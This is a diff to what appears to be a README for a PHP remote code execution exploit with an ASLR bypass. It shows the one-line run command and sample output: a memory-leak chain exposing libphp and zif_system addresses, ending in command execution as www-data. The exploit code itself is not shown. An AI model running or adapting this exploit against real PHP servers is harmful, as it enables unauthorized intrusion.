@@ -38,15 +38,15 @@ cd php2shell-bypass-aslr-exp
 # 2) 一条命令：A1 -> B1 泄漏 -> A2 -> B2 -> id
 # 默认IP为127.0.0.1
 python3 exploit.py --port 18110
-#       pinned 150/150 workers (149 holders)
-# [try 1] A1: END-cleanup send_cookie OOM
-# [try 1] B1: stale-id OOB read (chunk base + libphp)
-#       decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
-#       chunk buckets: [('0x7fe00c600000', 7495), ('0x7fe00ee00000', 1095),
-#                       ('0x7fe00cc00000', 87), ('0x7fe00c400000', 79)]
-# [try 1] A2 + B2: main=0x7fe00cc00000 S=0x7fe00ccf8398 zif_system=0x7fe00ed64370
-# [4/4] RCE OK; proof .../out/p1:
-# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+#      target 127.0.0.1:18110
+#      pinned 150/150 workers (149 holders)
+#[try 1] A1: END-cleanup send_cookie OOM
+#[try 1] B1: stale-id OOB read (chunk base + libphp)
+#      decoded=819208 zval_ptr_dtor=0x7fc098ebeb60 -> libphp=0x7fc098860000
+#      chunk buckets: [('0x7fc096400000', 7495), ('0x7fc098e00000', 1095), ('0x7fc096c00000', 87), ('0x7fc096200000', 79)]
+#[try 1] A2 + B2: main=0x7fc096c00000 S=0x7fc096cf8398 zif_system=0x7fc098cc5370
+#[4/4] RCE OK; proof .../out/p1:
+#uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 不编译 PHP/Apache、不 build 镜像、不挂 gdb、不改目标 ini。
